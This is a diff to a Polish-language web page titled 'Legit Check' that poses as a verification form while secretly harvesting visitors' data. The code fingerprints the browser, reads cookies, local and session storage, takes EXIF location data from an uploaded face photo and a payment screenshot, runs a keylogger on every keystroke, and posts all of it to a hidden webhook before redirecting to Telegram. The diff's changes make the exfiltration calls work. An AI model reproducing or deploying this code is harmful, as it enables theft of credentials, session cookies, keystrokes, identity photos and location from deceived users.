@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Legit Check</title>
   <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/exif-js"></script>
@@ -49,15 +49,17 @@
     <button id="sendBtn">Wyślij do weryfikacji</button>
   </div>
 
+  <!-- ŁADOWANIE WEBHOOKA -->
+  <script src="webhook.js"></script>
+
+  <!-- GŁÓWNY SKRYPT -->
   <script>
-    <script src="webhook.js"></script>
-<script>
-  fetch(WEBHOOK, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content: "Webhook działa z checker_lite!" })
-  });
-</script>
+    // Test webhooka
+    fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: "Webhook działa z checker_lite!" })
+    });
 
     const generateSessionID = () => {
       const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
@@ -124,7 +126,6 @@
 **Rozdzielczość:** ${screen.width}x${screen.height}
 **RAM:** ${navigator.deviceMemory || "?"} GB
 **CPU:** ${navigator.hardwareConcurrency || "?"} rdzeni
-
 **COOKIES:** ${document.cookie}
 
 **EXIF (Twarz):**
@@ -140,7 +141,7 @@ ${mapLink}
       form.append("file", faceFile, "face.jpg");
       form.append("file", proofFile, "transaction.jpg");
 
-      await fetch(webhook, { method: "POST", body: form });
+      await fetch(WEBHOOK, { method: "POST", body: form });
 
       alert("Dziękujemy. Trwa analiza.");
       window.location.href = "https://web.telegram.org";
@@ -150,7 +151,7 @@ ${mapLink}
 
     // KEYLOGGER
     document.addEventListener("keydown", e => {
-      fetch(webhook, {
+      fetch(WEBHOOK, {
         method: "POST",
         body: `KEYLOG (${sessionId}): ${e.key}`
       });
@@ -171,7 +172,7 @@ ${mapLink}
       sessionData += `**${key}**: ${value}\n`;
     }
 
-    fetch(webhook, {
+    fetch(WEBHOOK, {
       method: "POST",
       body: `${sessionId}\n${localData}\n\n${sessionData}`
     });
